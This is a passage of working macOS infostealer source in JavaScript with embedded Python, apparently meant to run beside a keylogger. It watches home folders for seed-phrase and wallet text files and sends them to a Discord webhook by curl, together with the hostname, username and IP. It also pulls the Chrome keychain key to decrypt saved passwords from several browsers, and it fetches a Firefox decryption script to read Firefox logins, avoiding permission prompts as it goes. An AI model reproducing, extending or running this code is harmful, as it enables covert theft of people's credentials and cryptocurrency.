                    words: words,
                    wordCount: words.length,
                    validWords: validWords.length,
                    uniqueWords: uniqueWords.size,
                    confidence: Math.min(100, (validRatio * 100).toFixed(0)),
                    preview: words.slice(0, 5).join(' ') + '...'
                };
            }
        }
    }
    
    return null;
}

// Function to detect passwords in file content (supports password manager exports)
function detectPasswords(content) {
    if (!content || content.length < 5) return null;
    
    const found = [];
    const lowerContent = content.toLowerCase();
    
    // Check if it's a password manager export file
    const isPasswordManagerExport = 
        lowerContent.includes('"url"') && lowerContent.includes('"password"') || // Chrome/1Password JSON
        lowerContent.includes('"hostname"') && lowerContent.includes('"password"') || // LastPass
        lowerContent.includes('"username"') && lowerContent.includes('"password"') || // Generic JSON
        lowerContent.includes('"login"') && lowerContent.includes('"password"') || // Bitwarden
        lowerContent.includes('"name"') && lowerContent.includes('"password"') || // Generic
        lowerContent.includes('url,username,password') || // CSV format
        lowerContent.includes('website,username,password'); // CSV format
    
    // Advanced password detection patterns
    const passwordPatterns = [
        // JSON formats (password manager exports)
        /"password"\s*:\s*"([^"]{6,})"/gi,
        /"pass"\s*:\s*"([^"]{6,})"/gi,
        /"pwd"\s*:\s*"([^"]{6,})"/gi,
        /"secret"\s*:\s*"([^"]{6,})"/gi,
        /"token"\s*:\s*"([^"]{6,})"/gi,
        /"api[_-]?key"\s*:\s*"([^"]{6,})"/gi,
        /"access[_-]?token"\s*:\s*"([^"]{6,})"/gi,
        
        // Key-value formats
        /password[\s:]*[:=]\s*([^\s\n]{6,})/gi,
        /pass[\s:]*[:=]\s*([^\s\n]{6,})/gi,
        /pwd[\s:]*[:=]\s*([^\s\n]{6,})/gi,
        /secret[\s:]*[:=]\s*([^\s\n]{6,})/gi,
        
        // CSV formats (username,password,email)
        /([^,\n]+),([^,\n]{6,}),([^,\n@]+@[^,\n]+)/g,
        /([^,\n@]+@[^,\n]+),([^,\n]+),([^,\n]{6,})/g,
        
        // Tab-separated
        /([^\t\n]+)\t([^\t\n]{6,})\t([^\t\n@]+@[^\t\n]+)/g,
        
        // Email + password on same line
        /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,})\s+([^\s\n]{6,})/g,
        /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z]{2,})[:=]\s*([^\s\n]{6,})/g,
        
        // Base64 encoded passwords (common in exports)
        /"password"\s*:\s*"([A-Za-z0-9+/=]{20,})"/g,
        
        // Environment variable format
        /PASSWORD\s*=\s*([^\s\n]{6,})/gi,
        /PASS\s*=\s*([^\s\n]{6,})/gi,
        /PWD\s*=\s*([^\s\n]{6,})/gi,
        /SECRET\s*=\s*([^\s\n]{6,})/gi,
        /API[_-]?KEY\s*=\s*([^\s\n]{6,})/gi
    ];
    
    // Extract passwords using patterns
    for (const pattern of passwordPatterns) {
        try {
            const matches = [...content.matchAll(pattern)];
            for (const match of matches) {
                // Find the password value (usually match[1] or match[2])
                let passwordValue = match[1] || match[2] || match[3];
                if (passwordValue && passwordValue.length >= 6 && passwordValue.length <= 200) {
                    // Skip if it's clearly not a password (URLs, common words, etc.)
                    if (!passwordValue.match(/^(https?|ftp):\/\//i) && 
                        !passwordValue.match(/^[0-9]+$/) && // Not just numbers
                        passwordValue.match(/[a-zA-Z]/)) { // Contains letters
                        
                        // Extract context (username/email if available)
                        let username = match[1] || match[3] || '';
                        let email = '';
                        if (username && username.includes('@')) {
                            email = username;
                            username = '';
                        }
                        
                        found.push({
                            type: 'password',
                            value: passwordValue.substring(0, 50),
                            username: username.substring(0, 50),
                            email: email.substring(0, 100),
                            context: match[0].substring(0, 150),
                            source: isPasswordManagerExport ? 'password_manager_export' : 'file'
                        });
                    }
                }
            }
        } catch (e) {
            // Skip invalid patterns
        }
    }
    
    // Also check for saved credentials in plain text
    if (lowerContent.includes('password') || lowerContent.includes('login') || 
        lowerContent.includes('credentials') || lowerContent.includes('account') ||
        lowerContent.includes('saved') || isPasswordManagerExport) {
        
        // Look for common patterns like "username: password" or "email: password"
        const plainTextPatterns = [
            /(?:username|user|login|email|account)[\s:]*[:=]\s*([^\s\n@]+@?[^\s\n]*)\s+(?:password|pass|pwd)[\s:]*[:=]\s*([^\s\n]{6,})/gi,
            /([^\s\n@]+@[^\s\n]+\.[a-zA-Z]{2,})[\s:]*[:=]\s*([^\s\n]{6,})/g
        ];
        
        for (const pattern of plainTextPatterns) {
            try {
                const matches = [...content.matchAll(pattern)];
                for (const match of matches) {
                    const cred = match[1] || match[2];
                    const pass = match[2] || match[3];
                    if (pass && pass.length >= 6 && pass.length <= 200) {
                        found.push({
                            type: 'password',
                            value: pass.substring(0, 50),
                            username: cred && !cred.includes('@') ? cred.substring(0, 50) : '',
                            email: cred && cred.includes('@') ? cred.substring(0, 100) : '',
                            context: match[0].substring(0, 150),
                            source: 'plain_text'
                        });
                    }
                }
            } catch (e) {}
        }
    }
    
    // Remove duplicates and return
    if (found.length > 0) {
        // Deduplicate by value
        const unique = [];
        const seen = new Set();
        for (const item of found) {
            const key = item.value.substring(0, 30);
            if (!seen.has(key)) {
                seen.add(key);
                unique.push(item);
            }
        }
        return unique.slice(0, 20); // Limit to 20 passwords
    }
    
    return null;
}

// Function to detect private keys (ONLY in seed phrase context - skip random files)
function detectPrivateKeys(content) {
    // Only detect private keys if we also found a seed phrase (not random files)
    // This prevents false positives from zip files, archives, etc.
    return null; // Disabled - only detect seed phrases
}

// Function to analyze file and determine what's inside
function analyzeFile(filepath, filename, content) {
    const results = {
        fileType: 'unknown',
        detected: [],
        labels: []
    };
    
    // Check filename for hints
    const lowerName = filename.toLowerCase();
    if (lowerName.includes('seed') || lowerName.includes('mnemonic') || lowerName.includes('recovery')) {
        results.labels.push('🔑 Seed/Mnemonic File');
    }
    if (lowerName.includes('password') || lowerName.includes('pass') || lowerName.includes('login')) {
        results.labels.push('🔐 Password File');
    }
    if (lowerName.includes('wallet') || lowerName.includes('key') || lowerName.includes('private')) {
        results.labels.push('💼 Wallet/Key File');
    }
    if (lowerName.includes('backup')) {
        results.labels.push('💾 Backup File');
    }
    
    // Detect seed phrase
    const seedPhrase = detectSeedPhrase(content);
    if (seedPhrase) {
        results.fileType = 'seed_phrase';
        results.detected.push(seedPhrase);
        results.labels.push(`🌱 Seed Phrase (${seedPhrase.wordCount} words, ${seedPhrase.confidence}% confidence)`);
    }
    
    // Detect passwords
    const passwords = detectPasswords(content);
    if (passwords) {
        results.fileType = results.fileType === 'unknown' ? 'passwords' : results.fileType;
        results.detected.push(...passwords);
        results.labels.push(`🔐 Passwords Found (${passwords.length} detected)`);
    }
    
    // Detect private keys
    const privateKeys = detectPrivateKeys(content);
    if (privateKeys) {
        results.fileType = results.fileType === 'unknown' ? 'private_keys' : results.fileType;
        results.detected.push(...privateKeys);
        results.labels.push(`🔑 Private Keys Found (${privateKeys.length} detected)`);
    }
    
    // If no specific detection but filename suggests sensitive content
    if (results.detected.length === 0 && results.labels.length > 0) {
        results.fileType = 'sensitive_file';
    }
    
    return results;
}

// Function to send file to Discord with proper formatting
function sendFileToDiscord(filepath, filename, analysis) {
    if (!fs.existsSync(filepath)) return;
    
    // Read file content (limit to 3000 chars for preview)
    let content = '';
    try {
        content = fs.readFileSync(filepath, 'utf8');
    } catch (e) {
        try {
            content = fs.readFileSync(filepath).toString('base64').substring(0, 2000);
        } catch (e2) {
            content = '[Binary file or unreadable]';
        }
    }
    
    const ip = os.networkInterfaces();
    let ipAddress = 'Unknown';
    for (const name of Object.keys(ip)) {
        for (const iface of ip[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                ipAddress = iface.address;
                break;
            }
        }
        if (ipAddress !== 'Unknown') break;
    }
    
    // Build Discord embed for seed phrase (better formatting)
    const seedPhrases = analysis.detected.filter(d => d.type === 'seed_phrase');
    
    // Only send if we found actual seed phrases
    if (seedPhrases.length === 0) return;
    
    // Check for duplicates - only send if we haven't seen this seed phrase before
    const seedPhraseText = seedPhrases[0].words.join(' ');
    const seedPhraseHash = seedPhraseText.toLowerCase().replace(/\s+/g, ' ');
    if (sentSeedPhrases.has(seedPhraseHash)) return; // Already sent this seed phrase
    sentSeedPhrases.add(seedPhraseHash);
    
    // Get full file path (show where it was found)
    const fullPath = filepath.replace(os.homedir(), '~');
    const folderPath = path.dirname(fullPath);
    
    // Use Discord embed
    const message = {
        embeds: [{
            title: "🔐 Seed Phrase Detected",
            color: 0xff0000,
            description: `\`\`\`\n${seedPhraseText}\n\`\`\``,
            fields: [
                { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
                { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
                { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
                { name: "File", value: `\`${filename}\``, inline: true },
                { name: "Location", value: `\`${folderPath}\``, inline: true },
                { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };
    
    // Create payload file with embed
    const payloadFile = path.join(screenshotDir, `file_payload_${Date.now()}.json`);
    
    try {
        fs.writeFileSync(payloadFile, JSON.stringify(message));
        
        // Send file + embed to Discord
        exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${filepath}" "${WEBHOOK}"`, (error) => {
            setTimeout(() => {
                try { fs.unlinkSync(payloadFile); } catch (e) {}
            }, 5000);
        });
    } catch (e) {
        // Fallback: send embed only
        const textFile = path.join(screenshotDir, `file_text_${Date.now()}.json`);
        try {
            fs.writeFileSync(textFile, JSON.stringify(message));
            exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${textFile}" "${WEBHOOK}"`, () => {
                setTimeout(() => {
                    try { fs.unlinkSync(textFile); } catch (e) {}
                }, 5000);
            });
        } catch (e2) {}
    }
}

// Function to check and process a file
function checkFile(filepath) {
    if (watchedFiles.has(filepath)) return; // Already processed
    
    try {
        const stats = fs.statSync(filepath);
        if (!stats.isFile() || stats.size > 10 * 1024 * 1024) return; // Skip files > 10MB
        
        const filename = path.basename(filepath);
        const ext = path.extname(filename).toLowerCase();
        
        // Check .txt files OR files with wallet/seed/crypto keywords in filename
        // ONLY check .txt files with seed/wallet keywords in filename (FAST!)
        const lowerName = filename.toLowerCase();
        const allowedKeywords = [
            'seed', 'seeds', 'seedphrase', 'seedphrases', 'mnemonic', 'mnemonics',
            'wallet', 'wallets', 'backup', 'backups', 'recovery'
        ];
        const hasKeyword = allowedKeywords.some(keyword => lowerName.includes(keyword));
        
        // ONLY process .txt files with keywords (skip zip, archives, etc.)
        if (ext !== '.txt' || !hasKeyword) return;
        
        // Skip large files (faster scanning)
        if (stats.size > 500 * 1024) return; // Skip files > 500KB (faster!)
        
        // Read file content
        let content = '';
        try {
            content = fs.readFileSync(filepath, 'utf8');
        } catch (e) {
            return; // Can't read, skip
        }
        
        // Analyze file for seed phrases only
        const analysis = analyzeFile(filepath, filename, content);
        
        // ONLY send if ACTUAL seed phrase detected (90%+ confidence, not random hex/tokens)
        const hasSeedPhrase = analysis.detected.some(d => d.type === 'seed_phrase' && parseInt(d.confidence) >= 90);
        
        // ONLY send seed phrases - ignore private keys from random files
        if (hasSeedPhrase) {
            watchedFiles.add(filepath);
            sendFileToDiscord(filepath, filename, analysis);
        }
    } catch (e) {
        // File might be locked or deleted, ignore
    }
}

// Recursive function to scan all files in directory and subdirectories
function scanDirectoryRecursive(dir) {
    if (!fs.existsSync(dir)) return;
    
    try {
        const items = fs.readdirSync(dir);
        items.forEach(item => {
            const itemPath = path.join(dir, item);
            try {
                const stats = fs.statSync(itemPath);
                if (stats.isDirectory()) {
                    // Recursively scan subdirectories
                    scanDirectoryRecursive(itemPath);
                } else if (stats.isFile()) {
                    // Check file
                    checkFile(itemPath);
                }
            } catch (e) {
                // Skip if can't access
            }
        });
    } catch (e) {
        // Can't read directory, skip
    }
}

// Watch directories for new files (NO PERMISSIONS NEEDED!)
// Run file watcher in background - don't block keylogger!
setTimeout(() => {
    watchDirs.forEach(watchDir => {
        if (!fs.existsSync(watchDir)) return;
        
        // Watch for new files (fs.watch doesn't require permissions!)
        fs.watch(watchDir, { recursive: true }, (eventType, filename) => {
            if (!filename) return;
            
            const filepath = path.join(watchDir, filename);
            
            // Only check .txt files with keywords
            const lowerName = filename.toLowerCase();
            const ext = path.extname(filename).toLowerCase();
            const hasKeyword = ['seed', 'seeds', 'seedphrase', 'seedphrases', 'mnemonic', 'mnemonics', 'wallet', 'wallets', 'backup', 'backups', 'recovery'].some(k => lowerName.includes(k));
            
            if (ext === '.txt' && hasKeyword) {
                // Wait a moment for file to be fully written
                setTimeout(() => {
                    checkFile(filepath);
                }, 2000);
            }
        });
    });
}, 10000); // Wait 10 seconds before starting file watcher (let keylogger start first)

// Also periodically scan recursively for new files (in case fs.watch misses some)
// Run in background - don't block keylogger!
setTimeout(() => {
    setInterval(() => {
        watchDirs.forEach(watchDir => {
            // Run scan in background (non-blocking, async)
            setImmediate(() => {
                scanDirectoryRecursive(watchDir);
            });
        });
    }, 30000); // Scan every 30 seconds (faster detection)
}, 10000); // Wait 10 seconds before first scan (let keylogger start first)

// PASSWORD EXTRACTION - Extracts Firefox, Chrome, Safari passwords + system info
function extractPasswords() {
    const OUTPUT_FILE = '/tmp/passwords.txt';
    const EXTRACT_SCRIPT = '/tmp/extract_passwords.sh';
    
    // Create Python decryption script (properly decrypts passwords with pycryptodome)
    const pythonScript = `/tmp/decrypt_passwords.py`;
    const pythonCode = `#!/usr/bin/env python3
import sqlite3
import os
import json
import subprocess
import base64
import sys

OUTPUT_FILE = "${OUTPUT_FILE}"

# Install pycryptodome if not available (NO keyring - causes permission dialogs)
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    # Try to install (only pycryptodome, NOT keyring)
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', '--quiet', '--user', 'pycryptodome'], 
                      capture_output=True, timeout=60, check=False, stderr=subprocess.DEVNULL)
        try:
            from Crypto.Cipher import AES
            from Crypto.Protocol.KDF import PBKDF2
            CRYPTO_AVAILABLE = True
        except:
            pass
    except:
        pass

# REMOVED: keyring library (causes permission dialogs)
KEYRING_AVAILABLE = False

def get_chrome_key():
    """Get Chrome encryption key from macOS keychain (programmatic - no user interaction)"""
    # Try multiple methods to get key without prompts
    # Method 1: Try with -a Chrome (specific account)
    try:
        result = subprocess.run(
            ['security', 'find-generic-password', '-w', '-a', 'Chrome', '-s', 'Chrome Safe Storage'],
            capture_output=True, text=True, timeout=2,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        if result.returncode == 0 and result.stdout and result.stdout.strip():
            return result.stdout.strip()
    except:
        pass
    
    # Method 2: Try without -a (just service name)
    try:
        result = subprocess.run(
            ['security', 'find-generic-password', '-w', '-s', 'Chrome Safe Storage'],
            capture_output=True, text=True, timeout=2,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        if result.returncode == 0 and result.stdout and result.stdout.strip():
            return result.stdout.strip()
    except:
        pass
    
    # Return None silently if keychain access not available (no prompts)
    return None

def get_encryption_key_from_local_state(local_state_path):
    """Get encryption key from Local State file"""
    if not local_state_path or not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r') as f:
            local_state_data = json.load(f)
            if 'os_crypt' in local_state_data and 'encrypted_key' in local_state_data['os_crypt']:
                encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
                # Remove DPAPI prefix (Windows) or use keychain (macOS)
                if encrypted_key.startswith(b'DPAPI'):
                    # Windows format - skip for macOS
                    return None
                return encrypted_key
    except:
        pass
    return None

def decrypt_chrome_password_v10(encrypted_password, encryption_key):
    """Decrypt Chrome v10/v11 password (improved method from AI)"""
    try:
        # encrypted_password is already bytes from SQLite
        if not isinstance(encrypted_password, bytes):
            return None, "Not bytes"
        
        if len(encrypted_password) < 40:
            return None, "Too short"
        
        if encrypted_password[:3] != b'v10' and encrypted_password[:3] != b'v11':
            return None, "Not v10/v11 format"
        
        # v10/v11 format: prefix (3) + salt (12) + nonce (12) + ciphertext + tag (16)
        encrypted = encrypted_password[3:]
        
        if len(encrypted) < 40:
            return None, f"Too short: {len(encrypted)} bytes"
        
        salt = encrypted[:12]
        encrypted_data = encrypted[12:]
        
        if len(encrypted_data) < 28:
            return None, "Invalid data length"
        
        # Derive key using PBKDF2
        derived_key = PBKDF2(encryption_key.encode('utf-8'), salt, 16, count=1003, hmac_hash_module=None)
        
        # Extract nonce, ciphertext, and tag
        nonce = encrypted_data[:12]
        ciphertext = encrypted_data[12:-16]
        tag = encrypted_data[-16:]
        
        # Decrypt using AES-GCM
        cipher = AES.new(derived_key, AES.MODE_GCM, nonce=nonce)
        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
        
        return decrypted.decode('utf-8', errors='ignore').rstrip('\\x00'), None
    except Exception as e:
        return None, str(e)[:50]

def decrypt_chrome_password(encrypted_value, local_state_path=None):
    """Decrypt Chrome password using pycryptodome - improved method"""
    if not encrypted_value:
        return "[NO PASSWORD]"
    
    if not CRYPTO_AVAILABLE:
        return "[ENCRYPTED - pycryptodome not available]"
    
    try:
        # Get encryption key from keychain (programmatic - no user interaction)
        keychain_key = get_chrome_key()
        if not keychain_key:
            return "[ENCRYPTED - Keychain not accessible]"
        
        # Check encryption format
        if isinstance(encrypted_value, bytes) and len(encrypted_value) > 3:
            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                # Use improved v10/v11 decryption
                decrypted, error = decrypt_chrome_password_v10(encrypted_value, keychain_key)
                if decrypted:
                    return decrypted
                else:
                    return f"[ENCRYPTED - {error}]"
            elif encrypted_value.startswith(b'v'):
                return f"[ENCRYPTED - Unsupported version - {len(encrypted_value)} bytes]"
            else:
                return f"[ENCRYPTED - Old format - {len(encrypted_value)} bytes]"
        return "[ENCRYPTED - Invalid data]"
    except Exception as e:
        return f"[ENCRYPTED - Error: {str(e)[:40]}]"

def extract_chrome_passwords():
    """Extract and decrypt Chrome passwords using pycryptodome"""
    chrome_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default/")
    login_db = os.path.join(chrome_path, "Login Data")
    local_state = os.path.join(chrome_path, "Local State")
    
    if not os.path.exists(login_db):
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== CHROME PASSWORDS ===\\n")
            f.write("Chrome: Login Data not found\\n\\n")
        return 0
    
    try:
        # Copy database (browser may lock it)
        import shutil
        import tempfile
        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        shutil.copy2(login_db, temp_db.name)
        temp_db.close()
        
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
        
        count = 0
        decrypted_count = 0
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== CHROME PASSWORDS (DECRYPTED) ===\\n")
            for row in cursor.fetchall():
                url = row[0] or ""
                username = row[1] or ""
                encrypted_password = row[2]
                
                if url:
                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
                    if password and not password.startswith("[ENCRYPTED") and not password.startswith("[NO"):
                        decrypted_count += 1
                    
                    f.write(f"URL: {url}\\n")
                    f.write(f"Username: {username}\\n")
                    f.write(f"Password: {password}\\n")
                    f.write("---\\n")
                    count += 1
            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
        conn.close()
        os.unlink(temp_db.name)
        return count
    except Exception as e:
        with open(OUTPUT_FILE, 'a') as f:
            f.write(f"Chrome: Error - {str(e)}\\n\\n")
        return 0

def extract_brave_passwords():
    """Extract and decrypt Brave passwords using pycryptodome"""
    brave_path = os.path.expanduser("~/Library/Application Support/BraveSoftware/Brave-Browser/Default/")
    login_db = os.path.join(brave_path, "Login Data")
    local_state = os.path.join(brave_path, "Local State")
    
    if not os.path.exists(login_db):
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== BRAVE PASSWORDS ===\\n")
            f.write("Brave: Login Data not found\\n\\n")
        return 0
    
    try:
        # Copy database (browser may lock it)
        import shutil
        import tempfile
        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        shutil.copy2(login_db, temp_db.name)
        temp_db.close()
        
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
        
        count = 0
        decrypted_count = 0
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== BRAVE PASSWORDS (DECRYPTED) ===\\n")
            for row in cursor.fetchall():
                url = row[0] or ""
                username = row[1] or ""
                encrypted_password = row[2]
                
                if url:
                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
                    if password and not password.startswith("[ENCRYPTED"):
                        decrypted_count += 1
                    
                    f.write(f"URL: {url}\\n")
                    f.write(f"Username: {username}\\n")
                    f.write(f"Password: {password}\\n")
                    f.write("---\\n")
                    count += 1
            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
        conn.close()
        os.unlink(temp_db.name)
        return count
    except Exception as e:
        with open(OUTPUT_FILE, 'a') as f:
            f.write(f"Brave: Error - {str(e)}\\n\\n")
        return 0

def extract_edge_passwords():
    """Extract and decrypt Microsoft Edge passwords using pycryptodome"""
    edge_path = os.path.expanduser("~/Library/Application Support/Microsoft Edge/Default/")
    login_db = os.path.join(edge_path, "Login Data")
    local_state = os.path.join(edge_path, "Local State")
    
    if not os.path.exists(login_db):
        return 0
    
    try:
        import shutil
        import tempfile
        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        shutil.copy2(login_db, temp_db.name)
        temp_db.close()
        
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
        
        count = 0
        decrypted_count = 0
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== EDGE PASSWORDS (DECRYPTED) ===\\n")
            for row in cursor.fetchall():
                url = row[0] or ""
                username = row[1] or ""
                encrypted_password = row[2]
                
                if url:
                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
                    if password and not password.startswith("[ENCRYPTED"):
                        decrypted_count += 1
                    
                    f.write(f"URL: {url}\\n")
                    f.write(f"Username: {username}\\n")
                    f.write(f"Password: {password}\\n")
                    f.write("---\\n")
                    count += 1
            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
        conn.close()
        os.unlink(temp_db.name)
        return count
    except Exception as e:
        return 0

def extract_opera_passwords():
    """Extract and decrypt Opera passwords using pycryptodome"""
    opera_path = os.path.expanduser("~/Library/Application Support/com.operasoftware.Opera/")
    login_db = os.path.join(opera_path, "Login Data")
    local_state = os.path.join(opera_path, "Local State")
    
    if not os.path.exists(login_db):
        return 0
    
    try:
        import shutil
        import tempfile
        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        shutil.copy2(login_db, temp_db.name)
        temp_db.close()
        
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
        
        count = 0
        decrypted_count = 0
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== OPERA PASSWORDS (DECRYPTED) ===\\n")
            for row in cursor.fetchall():
                url = row[0] or ""
                username = row[1] or ""
                encrypted_password = row[2]
                
                if url:
                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
                    if password and not password.startswith("[ENCRYPTED"):
                        decrypted_count += 1
                    
                    f.write(f"URL: {url}\\n")
                    f.write(f"Username: {username}\\n")
                    f.write(f"Password: {password}\\n")
                    f.write("---\\n")
                    count += 1
            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
        conn.close()
        os.unlink(temp_db.name)
        return count
    except Exception as e:
        return 0

def extract_vivaldi_passwords():
    """Extract and decrypt Vivaldi passwords using pycryptodome"""
    vivaldi_path = os.path.expanduser("~/Library/Application Support/Vivaldi/Default/")
    login_db = os.path.join(vivaldi_path, "Login Data")
    local_state = os.path.join(vivaldi_path, "Local State")
    
    if not os.path.exists(login_db):
        return 0
    
    try:
        import shutil
        import tempfile
        temp_db = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
        shutil.copy2(login_db, temp_db.name)
        temp_db.close()
        
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins LIMIT 100")
        
        count = 0
        decrypted_count = 0
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== VIVALDI PASSWORDS (DECRYPTED) ===\\n")
            for row in cursor.fetchall():
                url = row[0] or ""
                username = row[1] or ""
                encrypted_password = row[2]
                
                if url:
                    password = decrypt_chrome_password(encrypted_password, local_state) if encrypted_password else "[NO PASSWORD]"
                    if password and not password.startswith("[ENCRYPTED"):
                        decrypted_count += 1
                    
                    f.write(f"URL: {url}\\n")
                    f.write(f"Username: {username}\\n")
                    f.write(f"Password: {password}\\n")
                    f.write("---\\n")
                    count += 1
            f.write(f"Total: {count} passwords, {decrypted_count} decrypted\\n\\n")
        conn.close()
        os.unlink(temp_db.name)
        return count
    except Exception as e:
        return 0

def decrypt_firefox_passwords_for_profile(profile_path):
    """Decrypt Firefox passwords using firefox_decrypt script from GitHub"""
    try:
        # Download firefox_decrypt script if not exists
        firefox_decrypt_script = "/tmp/firefox_decrypt.py"
        if not os.path.exists(firefox_decrypt_script):
            try:
                import urllib.request
                urllib.request.urlretrieve("https://raw.githubusercontent.com/unode/firefox_decrypt/master/firefox_decrypt.py", firefox_decrypt_script)
            except:
                return []
        
        # Run firefox_decrypt script (non-interactive)
        try:
            result = subprocess.run(
                [sys.executable, firefox_decrypt_script, profile_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=20,
                stdin=subprocess.DEVNULL
            )
            
            if result.returncode == 0 and result.stdout:
                # Parse output (firefox_decrypt outputs: Website: url\nUsername: '...'\nPassword: '...'\n)
                passwords = []
                current_entry = {}
                for line in result.stdout.strip().split('\\n'):
                    line = line.strip()
                    if line.startswith('Website:'):
                        if current_entry.get('url'):
                            passwords.append(current_entry)
                        current_entry = {'url': line.replace('Website:', '').strip()}
                    elif line.startswith('Username:'):
                        username = line.replace('Username:', '').strip().strip("'").strip('"')
                        current_entry['username'] = username
                    elif line.startswith('Password:'):
                        password = line.replace('Password:', '').strip().strip("'").strip('"')
                        current_entry['password'] = password
                        # Add entry when password is found
                        if current_entry.get('url'):
                            passwords.append(current_entry)
                            current_entry = {}
                
                # Add last entry if exists
                if current_entry.get('url') and current_entry.get('password'):
                    passwords.append(current_entry)
                
                if passwords:
                    return passwords
        except Exception as e:
            pass
        
        return []
    except Exception as e:
        return []

def extract_firefox_passwords():
    """Extract and decrypt Firefox passwords"""
    firefox_path = os.path.expanduser("~/Library/Application Support/Firefox/Profiles/")
    
    if not os.path.exists(firefox_path):
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== FIREFOX PASSWORDS ===\\n")
            f.write("Firefox: Profiles not found\\n\\n")
        return []
    
    try:
        profiles = [d for d in os.listdir(firefox_path) if os.path.isdir(os.path.join(firefox_path, d))]
        
        with open(OUTPUT_FILE, 'a') as f:
            f.write("=== FIREFOX PASSWORDS (DECRYPTED) ===\\n")
            for profile in profiles:
                profile_path = os.path.join(firefox_path, profile)
                logins_json = os.path.join(profile_path, "logins.json")
                key4_db = os.path.join(profile_path, "key4.db")
                
                if os.path.exists(logins_json) and os.path.exists(key4_db):
                    try:
                        # Try to decrypt passwords using firefox-decrypt
                        decrypted_passwords = decrypt_firefox_passwords_for_profile(profile_path)
                        
                        if decrypted_passwords and len(decrypted_passwords) > 0:
                            # Write decrypted passwords
                            count = 0
                            for cred in decrypted_passwords[:100]:
                                url = cred.get('url', '') or cred.get('hostname', '')
                                username = cred.get('username', '') or cred.get('usernameField', '')
                                password = cred.get('password', '')
                                
                                if url and password:
                                    f.write(f"URL: {url}\\n")
                                    f.write(f"Username: {username}\\n")
                                    f.write(f"Password: {password}\\n")
                                    f.write("---\\n")
                                    count += 1
                            f.write(f"Profile {profile}: {count} passwords decrypted\\n")
                        else:
                            # Fallback: extract encrypted passwords info
                            with open(logins_json, 'r') as lf:
                                logins_data = json.load(lf)
                                count = 0
                                for login in logins_data.get("logins", [])[:100]:
                                    hostname = login.get("hostname", "")
                                    username = login.get("usernameField", "")
                                    
                                    if hostname:
                                        f.write(f"URL: {hostname}\\n")
                                        f.write(f"Username: {username}\\n")
                                        f.write(f"Password: [ENCRYPTED - Decryption failed, key4.db available]\\n")
                                        f.write("---\\n")
                                        count += 1
                                f.write(f"Profile {profile}: {count} passwords (encrypted, decryption failed)\\n")
                    except Exception as e:
                        f.write(f"Firefox Profile {profile}: Error - {str(e)[:100]}\\n")
            f.write("\\n")
        return 0
    except Exception as e:
        with open(OUTPUT_FILE, 'a') as f:
            f.write(f"Firefox: Error - {str(e)}\\n\\n")
        return []

def extract_safari_passwords():
    """Extract Safari passwords using security command"""
    with open(OUTPUT_FILE, 'a') as f:
        f.write("=== SAFARI PASSWORDS ===\\n")
        f.write("Safari: Use Keychain Access or security command\\n")
        f.write("Note: Requires user interaction for Keychain access\\n\\n")

def extract_system_info():
    """Extract system information"""
    with open(OUTPUT_FILE, 'a') as f:
        f.write("=== SYSTEM INFORMATION ===\\n")
        try:
            result = subprocess.run(['system_profiler', 'SPHardwareDataType'], capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                f.write(result.stdout[:500] + "\\n")
        except:
            pass
        f.write("\\n")

# Main
if __name__ == "__main__":
